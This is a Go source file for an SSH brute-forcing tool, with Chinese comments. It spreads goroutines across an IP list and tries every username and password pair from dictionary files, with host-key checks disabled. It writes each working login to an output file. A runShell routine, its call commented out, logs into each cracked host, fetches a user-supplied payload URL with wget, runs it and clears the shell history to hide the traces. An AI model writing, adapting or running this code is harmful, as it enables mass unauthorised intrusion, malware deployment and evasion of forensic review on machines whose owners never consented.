package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"path"
	"regexp"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func first() {
	var ok bool
	var ti int = 0
	var ip string

	for true {
		L3.Lock()
		if ipIndex >= len(ipList) {
			ok = getIpFromFile(ipPage * pageIpNum)
			if !ok {
				L3.Unlock()
				break
			}
			ipPage++
			ipIndex = 0
		}
		ip = ipList[ipIndex]
		ipIndex++
		L3.Unlock()

		L1.Lock()
		userIndexMap[ip] = 0
		passIndexMap[ip] = 0
		L1.Unlock()

		L2.Lock()
		ipWithNum[ip] = 1
		L2.Unlock()
		for ti = 0; ti < upNum; ti++ {
			go start(ip)
		}
		for true {
			L2.Lock()
			_, ok = ipWithNum[ip]
			L2.Unlock()
			if !ok {
				break
			}
			time.Sleep(3 * time.Second)
		}
	}
	wg.Done()
}

// 从文件获取ip
func getIpFromFile(index int) bool {
	var f *os.File
	var s *bufio.Scanner
	var start int = 0
	ipList = []string{}
	f, _ = os.OpenFile(IPP, os.O_RDONLY, 0777)
	defer f.Close()
	s = bufio.NewScanner(f)

	for s.Scan() {
		if start >= index && start < index+pageIpNum {
			ipList = append(ipList, s.Text())
		}
		start++
		if start >= index+pageIpNum {
			break
		}
	}
	if len(ipList) == 0 {
		return false
	} else {
		return true
	}
}
func start(ip string) {
	var user string
	var pass string
	var res int
	var ok bool
	var fo *os.File
	var logStr string
	var n int
	var client *ssh.Client

	fmt.Printf("正在进行--ip：%s\n", ip)

	for true {
		user = ""
		L2.Lock()
		if _, ok = ipWithNum[ip]; ok == false {
			L2.Unlock()
			break
		}
		L2.Unlock()
		L1.Lock()
		if _, ok = passIndexMap[ip]; ok == false {
			L1.Unlock()
			break
		} else if _, ok = userIndexMap[ip]; ok == false {
			L1.Unlock()
			break
		}

		if len(pwdList) > passIndexMap[ip] {
			pass = pwdList[passIndexMap[ip]]
			passIndexMap[ip]++
		} else {
			if len(userList)-1 > userIndexMap[ip] {
				userIndexMap[ip]++
				passIndexMap[ip] = 0
			} else {
				L1.Unlock()
				L2.Lock()
				delete(ipWithNum, ip)
				L2.Unlock()
				break
			}
		}
		user = userList[userIndexMap[ip]]
		L1.Unlock()

		for n = 0; n < 3; n++ {
			client, res = sshM(ip, user, pass)
			if res != 3 {
				break
			}
			time.Sleep(2 * time.Second)
		}
		if res == 1 {
			//切换ip
			L2.Lock()
			delete(ipWithNum, ip)
			L2.Unlock()
			//
			// runShell(client)
			client.Close()
			//写入
			logStr = fmt.Sprintf("%s:%s--%s\n", ip, user, pass)
			fo, _ = os.OpenFile(OUT, os.O_CREATE|os.O_RDWR|os.O_APPEND, 0777)
			fo.Write([]byte(logStr))
			fo.Close()
			// fmt.Println(client)
			break
		}
	}
	L1.Lock()
	delete(passIndexMap, ip)
	delete(userIndexMap, ip)
	L1.Unlock()
}

func sshM(ip string, user string, pass string) (*ssh.Client, int) {
	var sConfig *ssh.ClientConfig
	var connectPH string
	var client *ssh.Client
	var err error
	var output []byte
	sConfig = &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: 10 * time.Second,
	}

	connectPH = fmt.Sprintf("%s:%d", ip, 22)

	client, err = ssh.Dial("tcp", connectPH, sConfig)

	if err != nil {
		fmt.Printf("%s:%s--%s,错误:%s\n", ip, user, pass, err)
		if strings.Index(err.Error(), "timeout") > 0 {
			return &ssh.Client{}, 2
		} else if strings.Index(err.Error(), "EOF") > 0 || strings.Index(err.Error(), "An existing connection was forcibly") > 0 {
			return &ssh.Client{}, 3
		} else {
			return &ssh.Client{}, 4
		}
	} else {
		output = createSession(client, "pwd")
		if strings.Index(string(output), user) < 0 {
			return &ssh.Client{}, 5
		}
	}
	fmt.Printf("%s:%s--%s,成功\n", ip, user, pass)
	return client, 1
}

func createSession(client *ssh.Client, shell string) []byte {
	var session *ssh.Session
	var err error
	var output []byte
	session, err = client.NewSession()
	if err != nil {
		fmt.Println("创建客户端session失败")
		return []byte{}
	}
	output, err = session.CombinedOutput(shell)
	if err != nil {
		fmt.Println("执行命令失败")
		return []byte{}
	}
	return output
}

// 执行命令
func runShell(client *ssh.Client) bool {
	var session *ssh.Session
	var err error
	var output []byte
	session, err = client.NewSession()
	if err != nil {
		fmt.Println("创建客户端session1失败")
		return false
	}
	output, err = session.CombinedOutput("cd /home;wget " + DOWNLOAD + " -O " + DOWNNAME)
	session, err = client.NewSession()
	if err != nil {
		fmt.Println("创建客户端session2失败")
		return false
	}
	for true {
		output, err = session.CombinedOutput("cd /home;ls")
		if strings.Index(string(output), DOWNNAME) >= 0 {
			break
		}
		time.Sleep(2 * time.Second)
	}
	session, err = client.NewSession()
	if err != nil {
		fmt.Println("创建客户端session3失败")
		return false
	}
	output, err = session.CombinedOutput("cd /home;./" + DOWNNAME)
	session, err = client.NewSession()
	if err != nil {
		fmt.Println("创建客户端session4失败")
		return false
	}
	session.CombinedOutput("history -c")
	return true
}

func getIp(ipInt []int, n int, zi int) bool {
	if n <= zi {
		return false
	}
	if ipInt[n]+1 > 255 {
		ipInt[n] = 1
		n = n - 1
		return getIp(ipInt, n, zi)
	} else {
		ipInt[n] = ipInt[n] + 1
		return true
	}
}

func main() {
	var nowKey string = ""
	// var fInfo fs.FileInfo
	var f *os.File
	var fs *bufio.Scanner
	var err error
	// var IPL []string
	var k int
	var httpReg *regexp.Regexp
	var logFile *os.File
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	logFile, err = os.OpenFile(LOGFILE, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Panic("打开日志文件异常")
	}
	log.SetOutput(logFile)

	for i, v := range os.Args {
		if i > 0 && i%2 != 0 {
			nowKey = v
		} else {
			switch nowKey {
			case "-ip":
				IPP = v
			case "-nw":
				NWP = v
				break
			case "-pw":
				PWP = v
			case "-t":
				TNUM, _ = strconv.Atoi(v)
			case "-d":
				DOWNLOAD = v
			}
		}
	}

	_, err = os.Stat(NWP)
	if err != nil {
		fmt.Printf("打开用户名字典失败:%s\n", NWP)
		log.Printf("打开用户名字典失败:%s\n", NWP)
		os.Exit(0)
	}

	_, err = os.Stat(PWP)
	if err != nil {
		fmt.Printf("打开密码字典失败:%s\n", PWP)
		log.Printf("打开密码字典失败:%s\n", PWP)
		os.Exit(0)
	}
	_, err = os.Stat(IPP)
	if err != nil {
		fmt.Printf("打开ip文件失败:%s\n", IPP)
		log.Printf("打开ip文件失败:%s\n", IPP)
		os.Exit(0)
	}
	httpReg, err = regexp.Compile(`^http(s?)://[\w\d\.\-\_]*?/[\w\d\.\-\_]+$`)
	if !httpReg.MatchString(DOWNLOAD) {
		fmt.Println("下载地址不规范")
		log.Printf("下载地址不规范")
		os.Exit(0)
	}
	//用户名
	f, err = os.OpenFile(NWP, os.O_RDONLY, os.ModeAppend)
	fs = bufio.NewScanner(f)

	for fs.Scan() {
		userList = append(userList, fs.Text())
	}
	f.Close()
	//密码
	f, err = os.OpenFile(PWP, os.O_RDONLY, os.ModeAppend)
	fs = bufio.NewScanner(f)

	for fs.Scan() {
		pwdList = append(pwdList, fs.Text())
	}
	f.Close()
	//下载文件

	DOWNNAME = path.Base(DOWNLOAD)

	for k = 0; k < TNUM; k++ {
		wg.Add(1)
		go first()
	}
	wg.Wait()
	fmt.Println("运行完毕")
	log.Printf("运行完毕")
}
